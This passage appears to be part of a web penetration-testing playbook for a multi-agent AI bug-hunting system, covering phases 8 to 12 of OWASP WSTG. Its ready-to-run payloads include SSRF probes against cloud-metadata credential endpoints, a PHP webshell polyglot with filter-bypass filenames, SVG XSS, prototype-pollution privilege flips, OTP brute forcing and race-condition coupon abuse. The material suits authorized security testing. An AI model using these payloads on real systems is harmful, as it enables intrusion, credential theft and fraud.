- **Severity:** CVSS 4.3-6.1. Impact: phishing/data theft.
- **Dispatch:** -> XSSAgent

### 8.4 Client-side URL redirect / open redirect (WSTG-CLNT-04)

- **Objective / hypothesis:** A redirect param sends users to attacker domains (phishing; OAuth-token theft when chained with P4.14).
- **Procedure:**
```bash
for p in next url redirect return returnUrl dest continue callback; do
  bb -o /dev/null -w "$p -> %{http_code} %{redirect_url}\n" "$TARGET/login?$p=https://$COLLAB"
done | grep -i "$COLLAB"
```
- **Indicators:** `Location: https://$COLLAB` or client-side `window.location` to external host.
- **Validation:** Confirm the browser actually navigates off-site.
- **Evasion / edge cases:** `//evil`, `/\evil`, `https:evil`, `@`-confusion, whitelisted-domain prefix/suffix bypass, double-encoding.
- **Severity:** CVSS 4.3-6.1 standalone; up to 9.x when it steals OAuth tokens. Impact: phishing / token theft.
- **Dispatch:** -> OpenRedirectAgent

### 8.5 CSRF (WSTG-SESS-05)

- **Objective / hypothesis:** State-changing requests lack anti-CSRF protection (token/SameSite/origin checks).
- **Procedure:**
```bash
bb -X POST "$TARGET/api/settings" -H "Cookie: $COOKIE_A" -H "Content-Type: text/plain" \
   -d '{"email":"attacker@example.com"}' -D- -o /dev/null -w "no-token text/plain -> %{http_code}\n"
# Build a PoC auto-submit form and verify in a real browser via playwright-harness
```
- **Indicators:** State change succeeds with no token / cross-site origin / simple content-type (no preflight).
- **Validation:** Reproduce cross-origin in a real browser (cookies auto-sent) and confirm the state actually changed.
- **Evasion / edge cases:** SameSite=Lax still allows top-level GET; token not bound to session; `Content-Type: text/plain` avoids preflight; JSON-with-padding tricks.
- **Severity:** CVSS 4.3-8.1 (email/password change = ATO). Impact: forced actions / ATO.
- **Dispatch:** -> CSRFAgent

### 8.6 CSS injection (WSTG-CLNT-05)

- **Objective / hypothesis:** Injected CSS exfiltrates data (attribute selectors + `url()`) or defaces.
- **Procedure:** Inject style/selector payloads that leak token characters via background-image requests to `$COLLAB`.
- **Indicators:** Sequential Collaborator hits leaking secret characters.
- **Severity:** CVSS 4.3-6.5. Impact: data exfiltration (e.g. CSRF token).
- **Dispatch:** -> XSSAgent

### 8.7 Client-side resource manipulation & prototype pollution (WSTG-CLNT-06, -13)

- **Objective / hypothesis:** Attacker controls a script/resource URL or pollutes `Object.prototype` to reach a DOM/RCE gadget.
- **Procedure:**
```bash
bun "$TOOLS/playwright-harness.ts" --target "$TARGET?__proto__[testpp]=polluted" \
  --proxy "$BURP_PROXY" --mode test --screenshots "$EVIDENCE_DIR" --output "$FINDINGS_DIR/pp-client.json"
bb -X PUT "$TARGET/api/user/settings" -H "Cookie: $COOKIE_A" -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}' -D-
bb -X PUT "$TARGET/api/user/settings" -H "Cookie: $COOKIE_A" -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}' -D-
```
- **Indicators:** Polluted property observable (`Object.prototype.testpp`), or behavior change (`isAdmin` honored); gadget -> DOM XSS or RCE (EJS/Pug/Handlebars).
- **Validation:** Confirm the polluted property reaches a real gadget (privilege flip, script execution), not just set.
- **Evasion / edge cases:** `__proto__`, `constructor.prototype`, `[]`-notation, query/hash/JSON vectors; server PP->RCE via template `outputFunctionName` gadget.
- **Severity:** CVSS 6.1-9.8 (server PP->RCE). Impact: privesc / RCE / DOM XSS.
- **Dispatch:** -> PrototypePollutionAgent

### 8.8 CORS (WSTG-CLNT-07)

- **Objective / hypothesis:** ACAO reflects arbitrary/null origins with credentials -> cross-origin data theft (A01/A05).
- **Procedure:**
```bash
for o in "https://$COLLAB" "null" "https://evil.$TARGET_DOMAIN" "https://$TARGET_DOMAIN.$COLLAB"; do
  echo "Origin: $o"
  bb -H "Origin: $o" -H "Cookie: $COOKIE_A" "$TARGET/api/me" -D- -o /dev/null \
    | grep -iE "access-control-allow-(origin|credentials)"
done
```
- **Indicators:** `Access-Control-Allow-Origin` reflects the attacker origin AND `Access-Control-Allow-Credentials: true`.
- **Validation:** Build a cross-origin fetch PoC that reads authenticated data; `ACAO:*` + credentials is the critical combo.
- **Evasion / edge cases:** Null origin (sandboxed iframe), subdomain/suffix/prefix matching bugs, pre-flight bypass.
- **Severity:** CVSS 6.5-8.1. Impact: cross-origin data exfiltration.
- **Dispatch:** -> CORSAgent

### 8.9 Cross-site flashing (WSTG-CLNT-08)

- **Objective / hypothesis:** Legacy Flash/`crossdomain.xml` interplay enables cross-domain script (rare, legacy).
- **Procedure:** If any `.swf` remains, review `allowScriptAccess`/`allowDomain` and the cross-domain policy (P3.7).
- **Indicators:** Permissive Flash params + wildcard crossdomain.
- **Severity:** CVSS 4.3-6.5 (legacy). Impact: cross-domain script.
- **Dispatch:** -> XSSAgent

### 8.10 Clickjacking (WSTG-CLNT-09)

- **Objective / hypothesis:** Sensitive actions are framable -> UI redress.
- **Procedure:**
```bash
bb -D- "$TARGET/account/settings" -o /dev/null \
  | grep -iE "x-frame-options|content-security-policy.*frame-ancestors" \
  || echo "[FINDING] framable: no XFO / frame-ancestors"
```
- **Indicators:** No `X-Frame-Options` and no CSP `frame-ancestors` on a state-changing page.
- **Validation:** Build a framing PoC and confirm the page renders inside an attacker iframe in a real browser.
- **Severity:** CVSS 4.3-6.5 (depends on framed action). Impact: forced actions.
- **Dispatch:** -> CSRFAgent

### 8.11 WebSockets client trust (WSTG-CLNT-10)

- **Objective / hypothesis:** WS handshake lacks Origin validation / auth -> CSWSH (full server test in P11.2).
- **Procedure:** Quick handshake check here; deep CSWSH/message-injection in Phase 11.
- **Indicators:** Upgrade succeeds from a foreign Origin with the victim cookie.
- **Severity:** CVSS 6.5-8.1. Impact: cross-site WS hijack.
- **Dispatch:** -> WebSocketAgent

### 8.12 Web messaging / postMessage (WSTG-CLNT-11)

- **Objective / hypothesis:** A `message` handler trusts `event.data` without checking `event.origin` -> DOM XSS / data theft.
- **Procedure:**
```bash
grep -nE "addEventListener\(['\"]message['\"]|onmessage" "$RECON_DIR"/js-files.txt 2>/dev/null
# Drive a real browser to postMessage hostile data and watch the sink (playwright-harness custom script)
```
- **Indicators:** Handler routes `event.data` into `innerHTML`/`eval`/navigation with no/loose origin check.
- **Validation:** Send a cross-frame message in the instrumented browser and observe the sink fire.
- **Severity:** CVSS 6.1-8.8. Impact: DOM XSS / cross-window data theft.
- **Dispatch:** -> XSSAgent

### 8.13 Browser storage (WSTG-CLNT-12)

- **Objective / hypothesis:** Sensitive data (tokens, PII) lives in `localStorage`/`sessionStorage`/IndexedDB, readable by any XSS.
- **Procedure:** Dump storage via playwright-harness after login; classify contents.
- **Indicators:** JWT/refresh token/PII in localStorage; not cleared on logout.
- **Validation:** Confirm a real secret persists and is JS-readable.
- **Severity:** CVSS 4.3-6.5 (amplifies XSS to ATO). Impact: token theft surface.
- **Dispatch:** -> XSSAgent, SecretsExposureAgent

### 8.14 XSSI (WSTG-CLNT-13)

- **Objective / hypothesis:** A JS/JSON endpoint returning sensitive data is includable cross-origin via `<script>` -> data leak.
- **Procedure:** Identify dynamic-JS endpoints returning user data; test cross-origin `<script>` inclusion and variable capture.
- **Indicators:** Sensitive data assigned to global/callable vars readable by a foreign page.
- **Severity:** CVSS 5.3-7.5. Impact: cross-origin data leak.
- **Dispatch:** -> PrototypePollutionAgent

### Phase 8 artifacts
`$FINDINGS_DIR/{dalfox.json,dom-xss.json,csrf-findings.json,cors-findings.json,pp-client.json,openredirect-findings.json}`, screenshots/PoCs in `$EVIDENCE_DIR`.

### Phase 8 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| XSS (reflected/stored/DOM) | all input + DOM sinks | Required |
| CORS | all API endpoints | Required |
| CSRF + clickjacking | all state-changing actions | Required |
| Open redirect | all redirect params | Required |
| postMessage/storage/PP | reviewed | Required |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 9: REQUEST/RESPONSE MANIPULATION & INFRASTRUCTURE

**Objective:** SSRF (WSTG-INPV-18, A10), web cache poisoning/deception, HTTP request smuggling (WSTG-INPV-15, CL.TE/TE.CL/H2), subdomain takeover (WSTG-CONF-10), and host-header injection (WSTG-INPV-16). The "where the proxy/CDN/edge meets the app" surface.
**Expert rationale:** These are the high-skill, high-payout bugs a senior tester is uniquely good at: desync, cache, and SSRF-to-cloud-metadata. They need precise byte-level control and OOB confirmation.
**Gate-in:** Phase 8 advanced; CDN/proxy presence and webhook/URL params from AppProfile; `$COLLAB` live.
**Agents (HUNT subset):** SSRFAgent, CachePoisoningAgent, HTTPSmugglingAgent, SubdomainTakeoverAgent, CRLFAgent.
**Parallelizable:** Yes.

### 9.1 SSRF (WSTG-INPV-18, A10)

- **Objective / hypothesis:** URL-accepting params fetch attacker-chosen destinations -> cloud metadata / internal services.
- **Procedure:**
```bash
META=( "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
       "http://169.254.169.254/latest/api/token"
       "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
       "http://169.254.169.254/metadata/instance?api-version=2021-02-01" )
for param in url callback webhook redirect proxy fetch import src image avatar; do
  bb "$TARGET/api/fetch?$param=http://$COLLAB/ssrf-$param" -H "Cookie: $COOKIE_A" -o /dev/null
  for m in "${META[@]}"; do
    bb "$TARGET/api/fetch?$param=$m" -H "Cookie: $COOKIE_A" -o "$ARTIFACTS_DIR/ssrf-$param.body"
  done
done
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 20
grep -al "AccessKeyId\|-----BEGIN\|ami-id\|computeMetadata" "$ARTIFACTS_DIR"/ssrf-*.body 2>/dev/null
```
- **Indicators:** Collaborator hit (blind SSRF); IAM creds / GCP/Azure metadata in the response (full SSRF).
- **Validation:** Retrieve a second internal resource or live cloud creds; IMDSv2 needs the token-then-fetch two-step.
- **Evasion / edge cases:** IP encodings (hex/decimal/octal/short/IPv6), DNS rebinding (`*.nip.io`, Collaborator rebinder), redirect-to-internal, `gopher://`/`dict://`/`file://` protocol smuggling (Redis/SMTP), 30x-follow SSRF.
- **Severity:** CVSS up to 9.8 (cloud account takeover via stolen role creds). Impact: internal pivot, cloud compromise.
- **Dispatch:** -> SSRFAgent

### 9.2 Web cache poisoning & deception

- **Objective / hypothesis:** Unkeyed inputs poison shared cache (mass XSS/redirect) or path confusion caches private pages (deception).
- **Procedure:**
```bash
for h in X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto X-Host X-Original-URL X-Rewrite-URL X-Forwarded-Port; do
  bb -D- "$TARGET/" -H "$h: $COLLAB" -o /dev/null | grep -qi "$COLLAB" && echo "[CANDIDATE] unkeyed $h reflected"
done
for ext in .css .js .png /nonexistent.css; do
  bb -H "Cookie: $COOKIE_A" -D- "$TARGET/account/profile$ext" -o "$ARTIFACTS_DIR/wcd$ext.body" \
    | grep -iE "x-cache|cf-cache-status|age:"
done
```
- **Indicators:** Cache stores a response containing the attacker-controlled header (poisoning); private data returned with `X-Cache: HIT`/`Age` on a cacheable path (deception).
- **Validation:** Second, unauthenticated request to the same key returns the poisoned/private content -- prove cacheability and reach.
- **Evasion / edge cases:** Cache-buster discipline (test on a throwaway key), fat-GET, header-port, path normalization, `Vary` analysis.
- **Severity:** CVSS 6.5-9.0 (stored XSS to all users / private data to anyone). Impact: mass compromise / data theft.
- **Dispatch:** -> CachePoisoningAgent

### 9.3 HTTP request smuggling (WSTG-INPV-15)

- **Objective / hypothesis:** Front-end/back-end disagree on request boundaries (CL.TE/TE.CL/H2.CL) -> request hijack, cache poison, control bypass.
- **Procedure:**
```bash
python3 smuggler.py -u "https://$TARGET_DOMAIN/" --proxy "$BURP_PROXY" 2>/dev/null \
  | tee "$ARTIFACTS_DIR/smuggler.txt"
python3 h2csmuggler.py -x "$TARGET" --test 2>/dev/null
```
- **Indicators:** smuggler.py reports CL.TE/TE.CL with consistent timing delta; H2.CL desync confirmed.
- **Validation:** Use Burp Repeater (HTTP/1.1 last-byte sync or HTTP/2) to reproduce; demonstrate a benign smuggled prefix affecting a second request -- never attack other users' live traffic.
- **Evasion / edge cases:** TE obfuscation (`Transfer-Encoding: xchunked`, tab/space, dual TE), H2->H1 downgrade, CL.0, client-side desync.
- **Severity:** CVSS 7.4-9.1. Impact: request hijack, auth bypass, cache poisoning.
- **Dispatch:** -> HTTPSmugglingAgent

### 9.4 Subdomain takeover (WSTG-CONF-10)

- **Objective / hypothesis:** Dangling DNS (CNAME to a deprovisioned service) lets an attacker claim the subdomain.
- **Procedure:**
```bash
subjack -w "$RECON_DIR/subs-in-scope.txt" -t 100 -timeout 30 -ssl \
  -o "$FINDINGS_DIR/subjack.txt" 2>/dev/null
nuclei -l "$RECON_DIR/subs-in-scope.txt" -t takeovers/ -proxy "$BURP_PROXY" \
  -o "$FINDINGS_DIR/nuclei-takeovers.txt" 2>/dev/null
```
- **Indicators:** Fingerprint of an unclaimed service (S3/Heroku/GitHub Pages/Azure/etc.) on a dangling CNAME.
- **Validation:** Confirm the service is genuinely claimable (provider "no such bucket/app" page); do not register unless the program authorizes PoC.
- **Severity:** CVSS 6.5-8.6. Impact: subdomain hijack -> phishing, cookie theft, content injection.
- **Dispatch:** -> SubdomainTakeoverAgent

### 9.5 Host header injection (WSTG-INPV-16)

- **Objective / hypothesis:** App trusts `Host`/`X-Forwarded-Host` for link generation -> poisoned reset links (P4.11), SSRF, cache poisoning.
- **Procedure:**
```bash
bb -H "Host: $COLLAB" "$TARGET/" -D- -o /dev/null | grep -qi "$COLLAB" && echo "[CANDIDATE] Host reflected"
bb -H "X-Forwarded-Host: $COLLAB" "$TARGET/" -D- -o /dev/null | grep -i "location:\|$COLLAB"
```
- **Indicators:** Response/links/redirects contain the injected host; password-reset email points to `$COLLAB`.
- **Validation:** Tie to a concrete impact: poisoned reset (P4.11), cache poison (P9.2), or routing bypass.
- **Severity:** CVSS 5.3-9.8 (reset-link ATO). Impact: ATO / cache poisoning.
- **Dispatch:** -> CRLFAgent

### Phase 9 artifacts
`$FINDINGS_DIR/{ssrf-findings.json,cache-findings.json,smuggling-findings.json,subjack.txt,nuclei-takeovers.txt}`, `$ARTIFACTS_DIR/{ssrf-*.body,smuggler.txt,wcd*}`.

### Phase 9 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| SSRF | all URL-accepting params + metadata | Required |
| Cache poisoning/deception | all CDN-fronted pages | Required if CDN |
| Smuggling | FE/BE desync probed | Required if reverse proxy |
| Subdomain takeover | all CNAME subs verified | Required |
| Host-header injection | reset + link-gen tested | Required |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 10: BUSINESS LOGIC & RACE CONDITIONS

**Objective:** Full WSTG-BUSL (01-09): data validation, request forgery integrity, integrity checks, process timing, function-use limits, workflow circumvention, defenses against misuse, and upload of unexpected/malicious files (A04). Plus race conditions / single-packet attacks (A09 limit bypass).
**Expert rationale:** Logic flaws are the bugs scanners cannot find and the ones that cost the business directly (free goods, infinite credit, workflow bypass). They require understanding intent (from the AppProfile) and creative abuse. Races turn "once" into "many".
**Gate-in:** Phase 9 advanced; high-value/monetary flows and multi-step processes mapped (P2.2/P2.6).
**Agents:** BusinessLogicAgent, RaceConditionAgent, FileUploadAgent.
**Parallelizable:** Yes.

### 10.1 Business-logic data validation (WSTG-BUSL-01)

- **Objective / hypothesis:** Server trusts client-supplied values (price, quantity, discount, status) -> monetary/state abuse.
- **Procedure:**
```bash
bb -X POST "$TARGET/api/cart/add" -H "Cookie: $COOKIE_A" -H "Content-Type: application/json" \
  -d '{"item_id":"123","quantity":-1,"price":0.01}' -D-
bb -X POST "$TARGET/api/checkout" -H "Cookie: $COOKIE_A" -H "Content-Type: application/json" \
  -d '{"amount":0.004,"currency":"USD"}' -D-     # rounding to 0.00?
```
- **Indicators:** Negative quantity credits the account; client price honored; rounding yields free goods.
- **Validation:** Complete the flow and confirm the financial/state effect actually persisted.
- **Evasion / edge cases:** Integer overflow on quantity, currency confusion, decimal/locale tricks, replay of signed-but-mutable totals.
- **Severity:** CVSS 6.5-8.2. Impact: direct financial loss.
- **Dispatch:** -> BusinessLogicAgent

### 10.2 Ability to forge requests (WSTG-BUSL-02)

- **Objective / hypothesis:** Hidden/guessable parameters or predictable identifiers let a user forge requests they should not be able to make.
- **Procedure:** Add fields the UI never sends (`status:"paid"`, `discount:100`, `userId:<other>`); guess sequential order/invoice IDs.
- **Indicators:** Forged field accepted; guessed identifier acts on another entity.
- **Severity:** CVSS 6.5-8.6. Impact: unauthorized transactions.
- **Dispatch:** -> BusinessLogicAgent

### 10.3 Integrity checks (WSTG-BUSL-03)

- **Objective / hypothesis:** Client-controlled fields that should be server-authoritative (totals, roles, signatures) lack integrity enforcement (A08).
- **Procedure:** Tamper signed/hashed blobs and totals; test whether HMAC/signature is actually verified.
- **Indicators:** Mutated value accepted without signature rejection.
- **Severity:** CVSS 6.5-8.1. Impact: tamper of authoritative data.
- **Dispatch:** -> BusinessLogicAgent

### 10.4 Process timing & race conditions (WSTG-BUSL-04)

- **Objective / hypothesis:** TOCTOU windows let concurrent requests double-spend / over-redeem (single-packet attack).
- **Procedure:**
```bash
# Burp Turbo Intruder single-packet (HTTP/2) is ideal; portable burst PoC:
seq 30 | xargs -P30 -I{} curl -sk --proxy "$BURP_PROXY" -A "$UA" -H "Cookie: $COOKIE_A" \
  -X POST "$TARGET/api/coupon/redeem" -H "Content-Type: application/json" \
  -d '{"code":"WELCOME50"}' -o "$ARTIFACTS_DIR/race-{}.out" -w "%{http_code}\n" | sort | uniq -c
```
- **Indicators:** Coupon/gift/withdraw applied more times than allowed; balance goes negative.
- **Validation:** Confirm the over-application persisted (DB state), not just multiple 200s.
- **Evasion / edge cases:** Use single-packet/last-byte sync for true simultaneity; target redeem/withdraw/vote/invite-accept.
- **Severity:** CVSS 6.5-8.6. Impact: financial / limit-bypass.
- **Dispatch:** -> RaceConditionAgent

### 10.5 Function-use limits / rate limiting (WSTG-BUSL-05)

- **Objective / hypothesis:** "Once/limited" functions are unbounded, or rate limits are header-bypassable (A09).
- **Procedure:**
```bash
for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "True-Client-IP: 127.0.0.1"; do
  for i in $(seq 1 50); do bb -H "$h" -X POST "$TARGET/api/otp/verify" -d '{"otp":"00000'$((i%10))'"}' -o /dev/null -w "%{http_code} " ; done; echo " <- $h"
done
```
- **Indicators:** No throttle after the documented limit; per-IP limit defeated by spoofed headers; case/path-normalization bypass (`/API/`, `/api//`).
- **Validation:** Exceed the limit and observe the privileged effect (e.g. OTP brute success).
- **Severity:** CVSS 5.3-8.1. Impact: brute force / quota abuse.
- **Dispatch:** -> BusinessLogicAgent, RaceConditionAgent

### 10.6 Workflow circumvention (WSTG-BUSL-06)

- **Objective / hypothesis:** Multi-step processes can be skipped/reordered (pay-after-ship, verify-skip, approve-self).
- **Procedure:** Jump directly to a later step's endpoint; reuse a completion token from a different stage; submit steps out of order.
- **Indicators:** Process completes without a mandatory step (payment, approval, KYC).
- **Validation:** Confirm the end state was reached illegitimately.
- **Severity:** CVSS 6.5-8.6. Impact: control/process bypass.
- **Dispatch:** -> BusinessLogicAgent

### 10.7 Defenses against misuse (WSTG-BUSL-07)

- **Objective / hypothesis:** No detection/response to anomalous behavior (A09): aggressive scraping, tampering, and lockout-evading attacks go unnoticed.
- **Procedure:** Perform a controlled burst of clearly anomalous actions; check for any throttling, alerting, or account flagging.
- **Indicators:** No adaptive defense engages under obvious abuse.
- **Severity:** CVSS 3.7-5.3 (enabler). Impact: undetected attacks.
- **Dispatch:** -> BusinessLogicAgent

### 10.8 Upload of unexpected file types (WSTG-BUSL-08)

- **Objective / hypothesis:** Type/extension validation is bypassable -> stored XSS (SVG/HTML), DoS, or content confusion.
- **Procedure:**
```bash
UP=$(jq -r '.high_value_flows[]?|select(.agents[]?=="FileUploadAgent")|.endpoint' /tmp/app-profile.json | head -1)
cat > "$ARTIFACTS_DIR/xss.svg" <<'SVG'
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text>x</text></svg>
SVG
bb -X POST "$TARGET$UP" -H "Cookie: $COOKIE_A" -F "file=@$ARTIFACTS_DIR/xss.svg;type=image/svg+xml" -D-
```
- **Indicators:** SVG/HTML stored and served `Content-Type: image/svg+xml` (executes on view); MIME/extension filter bypassed.
- **Validation:** Open the stored file in a real browser; confirm script execution / wrong content-type.
- **Severity:** CVSS 6.1-8.0. Impact: stored XSS / content confusion.
- **Dispatch:** -> FileUploadAgent

### 10.9 Upload of malicious files / webshell (WSTG-BUSL-09)

- **Objective / hypothesis:** Upload + retrieval allows executable content (webshell) or path traversal write -> RCE.
- **Procedure:**
```bash
printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]);?>' > "$ARTIFACTS_DIR/poly.php.png"
for name in shell.php shell.pHp shell.php.jpg "shell.php%00.jpg" shell.phtml ".htaccess" "../../shell.php"; do
  bb -X POST "$TARGET$UP" -H "Cookie: $COOKIE_A" \
     -F "file=@$ARTIFACTS_DIR/poly.php.png;filename=$name;type=image/png" -D-
done
# Then attempt retrieval/execution of the stored path (in scope) and OOB-confirm
```
- **Indicators:** Uploaded script is retrievable and executes (`uid=`/OOB beacon); `.htaccess` reconfigures handler; traversal writes outside the upload dir.
- **Validation:** Execute one command via the uploaded shell with OOB confirmation; do not leave a live shell -- remove test artifacts.
- **Evasion / edge cases:** Double extension, null byte, case, magic-byte polyglot, content-type spoof, `.htaccess`/`web.config` handler injection, archive path traversal (zip-slip).
- **Severity:** CVSS up to 9.8. Impact: RCE.
- **Dispatch:** -> FileUploadAgent (RCE chain -> RCEAgent)

### Phase 10 artifacts
`$FINDINGS_DIR/{logic-findings.json,race-findings.json,upload-findings.json}`, `$ARTIFACTS_DIR/{race-*.out,poly.php.png,xss.svg}`.

### Phase 10 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| Monetary flows | all tested for manipulation | Required if e-commerce |
| Workflow bypass | all multi-step flows | Required |
| Race conditions | all limit/financial endpoints | Required |
| Rate limiting | login + sensitive endpoints | Required |
| Upload (unexpected + malicious) | all upload features | Required if upload |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 11: API & PROTOCOL TESTING

**Objective:** GraphQL (WSTG-APIT GraphQL), WebSocket (WSTG-CLNT-10 server-side), and REST API depth (WSTG-APIT-01 / OWASP API Top 10). Conditional -- runs only for the protocols the AppProfile detected.
**Expert rationale:** APIs are where authorization is thinnest and documentation is richest. A GraphQL introspection dump or an unguarded `/api/v1` legacy route is often the fastest path to crown jewels.
**Gate-in:** Phase 10 advanced; `graphql_detected`/`websocket_detected`/`api_endpoints` from AppProfile; OpenAPI spec (P2.7) if present.
**Agents (HUNT subset, conditional):** GraphQLAgent, WebSocketAgent, APIAgent.
**Parallelizable:** Yes (per detected protocol).

```bash
GRAPHQL=$(jq -r '.graphql_detected' /tmp/app-profile.json)
WEBSOCKET=$(jq -r '.websocket_detected' /tmp/app-profile.json)
API=$(jq -r '.api_endpoints | length > 0' /tmp/app-profile.json)
```

### 11.1 GraphQL (WSTG-APIT GraphQL)

- **Objective / hypothesis:** Introspection, batching, deep nesting, and per-field authz gaps expose data and bypass limits.
- **Procedure:**
```bash
bb -X POST "$TARGET/graphql" -H "Content-Type: application/json" -H "Cookie: $COOKIE_A" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' > "$ARTIFACTS_DIR/graphql-schema.json"
# Batching to bypass rate limits / brute
bb -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]'
# Field-suggestion leak even with introspection off
bb -X POST "$TARGET/graphql" -H "Content-Type: application/json" -d '{"query":"{ usr { id } }"}' | grep -i "did you mean"
```
- **Indicators:** Full schema returned; batched aliases brute-force objects; deep-nested query causes heavy latency (DoS); a field reachable that should require higher privilege.
- **Validation:** Confirm a per-field authz bypass returns data userA must not see (cross-ref P6).
- **Evasion / edge cases:** Alias-based batching, introspection via GET/`POST` `application/graphql`, suggestion mining, mutation IDOR.
- **Severity:** CVSS 6.5-9.1. Impact: mass data extraction / DoS / authz bypass.
- **Dispatch:** -> GraphQLAgent

### 11.2 WebSocket / CSWSH (WSTG-CLNT-10)

- **Objective / hypothesis:** WS upgrade ignores Origin/auth (CSWSH); message handlers are injectable.
- **Procedure:**
```bash
# Origin-less / foreign-origin handshake with the victim cookie
bb -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Origin: https://$COLLAB" \
  -H "Cookie: $COOKIE_A" "$TARGET/ws" -o "$ARTIFACTS_DIR/ws-handshake.txt"
```
- **Indicators:** `101 Switching Protocols` from a foreign Origin with the session cookie (CSWSH); message handler reflects/executes injected payloads.
- **Validation:** Establish the socket cross-origin and read/act on authenticated data.
- **Evasion / edge cases:** Missing Origin check, token-in-URL, message injection (XSS/command in handlers), lack of per-message authz.
- **Severity:** CVSS 6.5-8.1. Impact: cross-site WS hijack / data theft.
- **Dispatch:** -> WebSocketAgent

### 11.3 REST API depth (WSTG-APIT-01 / API Top 10)

- **Objective / hypothesis:** BOLA, mass assignment, version drift, and method gaps in the API tier.
- **Procedure:**
```bash
bb -X POST "$TARGET/api/users" -H "Content-Type: application/json" -H "Cookie: $COOKIE_A" \
  -d '{"name":"t","email":"t@example.com","role":"admin","credits":999999}' -D-
for ver in v1 v2 v3 beta internal legacy; do
  bb "$TARGET/api/$ver/users" -H "Cookie: $COOKIE_A" -o /dev/null -w "$ver: %{http_code}\n"
done
for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  bb -X "$m" "$TARGET/api/admin/users" -H "Cookie: $COOKIE_A" -o /dev/null -w "$m: %{http_code}\n"
done
```
- **Indicators:** Mass-assignment fields honored; legacy `/v1` unsecured vs hardened `/v2`; method gap exposes admin function.
- **Validation:** Confirm the privileged effect (BOLA returns another user; mass-assign elevates).
- **Severity:** CVSS 6.5-9.1. Impact: data breach / privilege escalation.
- **Dispatch:** -> APIAgent

### Phase 11 artifacts
`$FINDINGS_DIR/{graphql-findings.json,websocket-findings.json,api-findings.json}`, `$ARTIFACTS_DIR/{graphql-schema.json,ws-handshake.txt}`.

### Phase 11 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| GraphQL (if present) | introspection/batch/field-authz | Required if GQL |
| WebSocket (if present) | CSWSH + message injection | Required if WS |
| REST API | BOLA + mass-assign + version + method | Required if API |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 12: VALIDATION, CHAINING & REPORTING (Hand-off)

**Objective:** Turn raw per-agent findings into a validated, de-duplicated, chained, CVSS-scored report. This is the META group of the agent-router plan: VALIDATE (ValidatorAgent) then CHAIN (ExploitChainAgent), then the deliverable.
**Expert rationale:** Triagers reject what they cannot reproduce and downgrade what is not impactful. The value of an assessment is realized here -- reproducibility, no duplicates, honest scoring, and the kill chains that elevate a pile of mediums into a critical.
**Gate-in:** All preceding phases advanced or skipped; per-agent findings written to `$FINDINGS_DIR`.
**Agents:** ValidatorAgent (reproduce/de-dup/score/gate), ExploitChainAgent (correlate into kill chains).

### 12.1 Aggregate all agent findings

```bash
jq -s 'add // []' "$FINDINGS_DIR"/*-findings.json 2>/dev/null > "$FINDINGS_DIR/all-findings-raw.json"
echo "[REPORT] raw findings: $(jq 'length' "$FINDINGS_DIR/all-findings-raw.json")"
```

### 12.2 ValidatorAgent -- reproduce, de-dup, score, gate

- **Objective:** Every reported issue must reproduce from artifacts, be unique by root cause, carry a defensible CVSS 3.1/4.0 score, and pass the hunt-mode gate.
- **Procedure:**
```text
Deploy (VALIDATE group):
  ValidatorAgent <- all-findings-raw.json + $ARTIFACTS_DIR (req/resp, screenshots, OOB logs)
  Tasks:
   1. Reproduce each finding from the saved request/response (re-fire through Burp). Drop anything that does not reproduce.
   2. Kill false positives: generic 500s, soft-404s, self-XSS, reflected-but-encoded, non-exploitable info.
   3. De-duplicate by ROOT CAUSE (same sink/control), not by URL -- keep the highest-impact instance.
   4. Score CVSS 3.1 (and 4.0 where the program uses it); record vector strings.
   5. Apply the hunt-mode gate.
  Output -> $FINDINGS_DIR/validated.json
```
```bash
HUNT_MODE_NOW=$(jq -r '.mode' "$RUN_DIR"/state.json 2>/dev/null || echo "$HUNT_MODE")
jq --arg mode "$HUNT_MODE_NOW" '
  def threshold: if $mode=="bounty" then 8.0 elif $mode=="pentest" then 4.0 else 0.0 end;
  [ .[] | select(
     (.cvss // 0) >= threshold or
     (.type|ascii_downcase|test("auth bypass|pre-auth rce|account takeover|privilege escalation|idor|ssrf|sqli|stored xss"))
  ) ]' "$FINDINGS_DIR/validated.json" > "$FINDINGS_DIR/gated.json"
jq 'group_by(.root_cause // (.type+.endpoint)) | map(max_by(.cvss)) | sort_by(-.cvss)' \
  "$FINDINGS_DIR/gated.json" > "$FINDINGS_DIR/final-findings.json"
```
- **Indicators of a clean validation:** Each surviving finding has a reproducible request, a CVSS vector, and a one-line root cause.
- **Dispatch:** -> ValidatorAgent

### 12.3 ExploitChainAgent -- correlate into kill chains

- **Objective:** Combine validated findings into end-to-end attack chains and elevate the combined CVSS to reflect real business impact.
- **Procedure:**
```text
Deploy (CHAIN group):
  ExploitChainAgent <- final-findings.json + AppProfile (trust boundaries, crown jewels)
  Correlate known patterns, e.g.:
   - ATO chain:        open-redirect (P8.4) + OAuth redirect_uri (P4.14) -> token theft
   - ATO chain:        host-header injection (P9.5) + reset flow (P4.11) -> mass takeover
